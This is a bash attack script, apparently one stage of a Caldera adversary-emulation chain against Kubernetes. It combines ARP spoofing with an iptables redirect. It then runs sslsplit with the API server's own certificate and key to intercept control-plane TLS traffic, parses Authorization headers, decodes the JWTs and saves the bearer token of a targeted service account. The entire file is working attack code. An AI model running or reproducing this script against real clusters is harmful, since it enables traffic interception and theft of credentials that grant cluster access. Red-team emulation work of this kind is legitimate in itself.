#!/usr/bin/env bash
set -euo pipefail

UPSTREAM_HOST="$CONTROL_PLANE_NODE"
UPSTREAM_PORT="$CONTROL_PLANE_PORT"
IFACE="eth0"
LOGDIR="$DATA_PATH/KC5/logdir"
PIDFILE="$DATA_PATH/KC5/arp_pids"

LEAF_PEM="$DATA_PATH/KC5/inbound.pem"
TOKEN_RE='[Bb]earer[[:space:]]+([A-Za-z0-9._~+/=\-]+)'
REQUIRED_SUBSTR="system:serviceaccount:$LOG_NS:updater-sa"
OUTPUT_PATH="$DATA_PATH/KC5/found_token"
IPAPI=$(dig +short $UPSTREAM_HOST A)

cleanup() {
  echo "[*] Cleanup..."
  /opt/caldera/common/remove-pids.sh "$PIDFILE" || echo "[WARN] remove-pids failed" >&2
  iptables -t nat -D PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT" 2>/dev/null || true
  [[ -n "${SSLPID:-}" ]] && kill "$SSLPID" 2>/dev/null || true
  exit 0
}
trap cleanup EXIT

# 0) Increase inotify limits to avoid errors
sysctl -w fs.inotify.max_user_instances=1024

# 1) Setup
apt update >/dev/null 2>&1
apt install -y sslsplit inotify-tools jq iptables iproute2 ca-certificates >/dev/null 2>&1
mkdir -p $LOGDIR

# 2) Modification ip status
sysctl -w net.ipv4.conf.all.rp_filter=0
sysctl -w net.ipv4.conf."$IFACE".rp_filter=0
sysctl -w net.ipv4.ip_forward=1

# 3) REDIRECT TCP traffic directed to VIP:CONTROL_PLANE_PORT to local port CONTROL_PLANE_PORT (proxy)
if ! iptables -t nat -C PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT" 2>/dev/null; then
  iptables -t nat -A PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT"
fi

/opt/caldera/KC2/nmap-enum.sh $DATA_PATH/KC5
/opt/caldera/KC2/arp-spoof.sh "$IPAPI" "/tmp/iphost" "$DATA_PATH/KC5/node_traffic" "$DATA_PATH/KC5/tcpdump_stdout_err.log" "worker" $PIDFILE

cat /apiserver/apiserver.crt /apiserver/apiserver.key > $LEAF_PEM

nohup sslsplit \
  -A "$LEAF_PEM" \
  -P \
  -S "$LOGDIR" \
  -M "$DATA_PATH/KC5/sslkeys.log" \
  -l "$DATA_PATH/KC5/connect.log" \
  -D \
  ssl 0.0.0.0 "$UPSTREAM_PORT" >/dev/null 2>&1 &
SSLPID=$!

inotifywait -mq -e create "$LOGDIR" | while read -r _ _ file; do
  f="$LOGDIR/$file"
  # small wait - sslsplit writes in append
  sleep 0.3

  # 1) takes Authorization header (case-insensitive)
  auth_line="$(awk 'tolower($1)=="authorization:" {for(i=2;i<=NF;i++) printf "%s ", $i; print ""; exit}' "$f" 2>/dev/null || true)"
  [[ -z "$auth_line" ]] && continue

  # 2) takes only token (remove "Bearer ")
  tok="$(printf '%s' "$auth_line" | grep -Eo "$TOKEN_RE" | sed -E 's/^[Bb]earer[[:space:]]+//; s/[[:space:]]+$//; q' || true)"
  [[ -z "$tok" ]] && continue

  # 3) decodes payload (base64url → json)
  IFS='.' read -r _ payload _ <<< "$tok"
  payload_json="$(printf '%s' "$payload" \
    | tr '_-' '/+' \
    | awk '{l=length($0)%4; if(l==2){print $0"=="} else if(l==3){print $0"="} else if(l==0){print $0} else {print $0}}' \
    | base64 -d 2>/dev/null || true)"
  [[ -z "$payload_json" ]] && continue

  # 4) verify string in JSON (or on .sub)
  if echo "$payload_json" | grep -q -- "$REQUIRED_SUBSTR"; then
    printf '%s\n' "$tok" > "$OUTPUT_PATH"
    echo "[*] Token saved (match on JSON) → $OUTPUT_PATH"
    exit 0
  else
    sub="$(echo "$payload_json" | jq -r '.sub // empty' 2>/dev/null || true)"
    if [[ -n "$sub" && "$sub" == *"$REQUIRED_SUBSTR"* ]]; then
      printf '%s\n' "$tok" > "$OUTPUT_PATH"
      echo "[*] Token saved (match on .sub) → $OUTPUT_PATH"
      exit 0
    fi
  fi
done